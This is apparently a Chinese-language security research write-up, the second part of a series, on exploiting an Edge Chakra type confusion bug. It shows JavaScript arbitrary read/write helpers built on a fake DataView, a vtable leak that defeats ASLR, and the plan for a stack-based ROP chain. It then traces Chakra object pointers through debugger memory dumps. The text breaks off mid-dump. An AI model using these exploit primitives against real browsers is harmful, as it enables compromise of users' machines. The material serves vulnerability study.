# Edge Type Confusion利用：从内存读写到控制流程
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 本篇原创文章参加双倍稿费活动，预估稿费为800元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)
### 传送门：[Edge Type Confusion利用：从type
confused到内存读写](https://www.anquanke.com/post/id/98774)
>
> 在上一部分中我们通过在NativeIntArray的Segment数据区中伪造DataView对象获得了内存读写的能力，在这部分目标是进一步由内存读写到控制程序执行流。
## 准备工作
在Edge中地址等数据都是64位的，但是在目前的Javascript中不支持Int64类型，这样就没有办法直接通过DataView读出64位或者对64位整数进行运算，这里需要我们自己做一些工作来方便数据操作
    Because JavaScript doesn't currently include standard support for 64-bit integer values, js-ctypes offers the Int64 and UInt64 objects to let you work with C functions and data that need (or may need) values represented using a 64-bit data type.
    You use the Int64 object to create and manipulate 64-bit signed integers.
通过自己定义一个Int64类型，使用low、high两部分int32储存int64
    function Int64(low,high) 
    {
        this.low = low;
        this.high = high;
    }
为了方便读写，编写了r64、w64这些函数，可以直接拿来操作数据。
    function r64(addr)
    {
        fake_object[14]=addr.low; 
        fake_object[15]=addr.high;
        return new Int64(obj.getUint32.call(arr[0],0,true),
                         obj.getUint32.call(arr[0],4,true));
    }
    function r32(addr)
    {
        fake_object[14]=addr.low; 
        fake_object[15]=addr.high;    
        return obj.getUint32.call(arr[0],0,true);
    }
    function w64(addr,value)
    {
        fake_object[14]=addr.low; 
        fake_object[15]=addr.high;
        return new Int64(obj.setUint32.call(arr[0],0,value.low,true),
                         obj.setUint32.call(arr[0],4,value.high,true));
    }
## bypass ASLR
ASLR使得进程模块的地址不固定，但是由于这里我们已经具有了通过DataView读写内存的能力，所以可以直接选择泄漏对象虚表获取模块基址。
调试发现在fake DataView上方存在一个NativeIntArray对象(其实就是为了伪造DataView创建的那个)，偏移是0x58
    var vtable_addr=new Int64(DataView_basel-0x58,DataView_baseh);
    var vtable_value=r64(vtable_addr);
    print(vtable_value.low.toString(16));
    print(vtable_value.high.toString(16));
通过DataView读出NativeIntArray vtable地址是0x7ff82a42c7d0，offset是0x18051C7D0，  
得到Charka.dll的基址为0x7ff6a9f10000。
## bypass DEP
因为存在DEP保护，内存不具有可执行权限。在老版本的浏览器中可以考虑通过劫持对象的虚表进行利用，但是在edge中存在cfg保护，cfg保护了程序中的间接调用，对于cfg来说似乎没有什么太好的公开可用的绕过方法。所以另一个比较简单的利用思路是通过栈，通过控制栈的返回地址来进行rop。
## 寻找栈地址
想通过栈进行利用，首先要找到栈的返回地址。目前的漏洞操作其实都是位于edge的custom
heap上的，要想通过栈进行利用需要通过堆上的数据结构获取栈的地址。  
由于已经具有任意地址读写的能力，我们需要找到一个恰当的数据结构来获取这个地址。
实际的获取过程可以说比较曲折，中心思想是在threadContext对象中保存着域stackLimitForCurrentThread，这个域保存着本线程线程栈的上界，可以利用这个值通过计算和搜索得出返回值的栈地址。
获取这个值的过程比较复杂，首先可以从任意Dynamic Object中获取Type Object的地址。这个Type
Object的类型是无所谓的，因为目标是其中的JavascriptLibrary指针。  
在Chakra中除了立即数等基本上所有的对象都是Dynamic对象，也继承自DynamicObject类，所有的Dynamic Object都有Type
Object来表示类型和保存一些信息。  
在这里上一篇文章中伪造DataView时用到的JavascriptNativeIntArray自然也属于DynamicObject，我们使用这个DynamicObject中的TypeObject来完成操作。
    0x000001B1354C80A0  00007ff826c8c7d0  ???&?... <=nativeArray
    0x000001B1354C80A8  000001b135484f80  €OH5?... <=type object
    0x000001B1354C80B0  0000000000000000  ........
    0x000001B1354C80B8  0000000000000005  ........
    0x000001B1354C80C0  0000000000000010  ........
    0x000001B1354C80C8  000001b1354c80e0  ?€L5?...
    0x000001B1354C80D0  000001b1354c80e0  ?€L5?...
    0x000001B1354C80D8  000001a9352189c0  ??!5?...
    0x000001B1354C80E0  0000001000000000  ........
    0x000001B1354C80E8  0000000000000012  ........
    0x000001B1354C80F0  0000000000000000  ........
    0x000001B1354C80F8  00000000000004d2  ?.......
    0x000001B1354C8100  000001b1354c8108  .?L5?...
    0x000001B1354C8108  0000000000000038  8.......
    0x000001B1354C8110  000001b1354c7cc8  ?|L5?...
    0x000001B1354C8118  0000000000000200  ........
    0x000001B1354C8120  000001b1354c80b8  ?€L5?...
    0x000001B1354C8128  0000000000000000  ........
    0x000001B1354C8130  000001b1354c80a0  ?€L5?...
    let type_addr=new Int64(DataView_basel-0x50,DataView_baseh);
    let type_value=r64(type_addr);
    print('TypeObject address');
    print(type_value.high.toString(16));
    print(type_value.low.toString(16));
这里成功获得了Type Object的地址0x233e89f4f80
接下来看Type Object的内存(不同次调试结果，地址不同)，Type Object偏移0x8的地方是javascriptLibrary的指针
    0x000001B135484F80  000000000000001d  ........ <= Type Object
    0x000001B135484F88  000001b135498000  .€I5?... <= javascriptLibrary
    0x000001B135484F90  000001b1354b0000  ..K5?...
我们需要获取javascriptLibrary对象的地址
    let jslib_addr=new Int64(type_value.low+0x8,type_value.high);
    let jslib_value=r64(jslib_addr);
    print('javascriptLibrary address');
    print(jslib_value.high.toString(16));
    print(jslib_value.low.toString(16));
得到javascriptLibrary对象的地址是0x21f5bd08000(不同次调试结果，地址不同)
然而事情还没完，获得JavascriptLibrary的地址是为了得到其中的scriptcontext指针。JavascriptLibrary这个结构比较大，scriptcontext位于偏移0x430的位置
    javascriptLibrary
    0x000001B135498000  00007ff826cc3768  h7?&?...
    0x000001B135498008  000001b135490000  ..I5?...
    0x000001B135498010  000001b1354c0c00  ..L5?...
    0x000001B135498018  000001b1354c0c80  €.L5?...
    0x000001B135498020  000001b1354c0d00  ..L5?...
    0x000001B135498028  000001b1354c0d80  €.L5?...
    0x000001B135498030  000001b135487fc0  ?.H5?...
    0x000001B135498038  000001b1354c0600  ..L5?...
    0x000001B135498040  000001b1354c0680  €.L5?...
    0x000001B135498048  000001b1354c0700  ..L5?...
    0x000001B135498050  000001b1354c0780  €.L5?...
    0x000001B135498058  000001b1354c0800  ..L5?...
    0x000001B135498060  000001b1354c0880  €.L5?...
    0x000001B135498068  000001b1354c0900  ..L5?...
    0x000001B135498070  000001b1354c0980  €.L5?...
    0x000001B135498078  000001b1354c0a00  ..L5?...
    0x000001B135498080  000001b1354c0a80  €.L5?...
    0x000001B135498088  000001b1354c0500  ..L5?...
    0x000001B135498090  000001b1354c0580  €.L5?...
    0x000001B135498098  000001b1354c0040  @.L5?...
    0x000001B1354980A0  000001b1354c0280  €.L5?...
    0x000001B1354980A8  000001b1354c0300  ..L5?...
    0x000001B1354980B0  000001b1354c03c0  ?.L5?...
    0x000001B1354980B8  000001b135487f40  @.H5?...
    0x000001B1354980C0  000001b1354c00c0  ?.L5?...
    0x000001B1354980C8  000001b1354b00d0  ?.K5?...
    0x000001B1354980D0  000001b1354c0440  @.L5?...
    0x000001B1354980D8  0000000000000000  ........
    0x000001B1354980E0  000001b1354c0e80  €.L5?...
    0x000001B1354980E8  000001b1354c0f00  ..L5?...
    0x000001B1354980F0  000001b1354c0f80  €.L5?...
    0x000001B1354980F8  000001b1354c1000  ..L5?...
    0x000001B135498100  000001b1354c1080  €.L5?...
    0x000001B135498108  000001b1354c1100  ..L5?...
    0x000001B135498110  000001b1354c1180  €.L5?...
    0x000001B135498118  000001b1354c0140  @.L5?...
    0x000001B135498120  000001b1354c0200  ..L5?...
    0x000001B135498128  000001b1354c0e00  ..L5?...
    0x000001B135498130  0000000000000000  ........
    0x000001B135498138  000001b135486f40  @oH5?...
    0x000001B135498140  000001b135486fc0  ?oH5?...
    0x000001B135498148  000001b1354870c0  ?pH5?...
    0x000001B135498150  000001b1354871c0  ?qH5?...
    0x000001B135498158  000001b1354872c0  ?rH5?...
    0x000001B135498160  000001b1354873c0  ?sH5?...
    0x000001B135498168  0000000000000000  ........
    0x000001B135498170  0000000000000000  ........
    0x000001B135498178  0000000000000000  ........
    0x000001B135498180  000001b1354874c0  ?tH5?...
    0x000001B135498188  000001b1354875c0  ?uH5?...
    0x000001B135498190  0000000000000000  ........
    0x000001B135498198  000001b1354acae0  ??J5?...
    0x000001B1354981A0  0000000000000000  ........
    0x000001B1354981A8  0000000000000000  ........
    0x000001B1354981B0  000001b1354acb00  .?J5?...
    0x000001B1354981B8  000001b1354acb20   ?J5?...
    0x000001B1354981C0  000001b1354c0b80  €.L5?...
    0x000001B1354981C8  000001b1354acac0  ??J5?...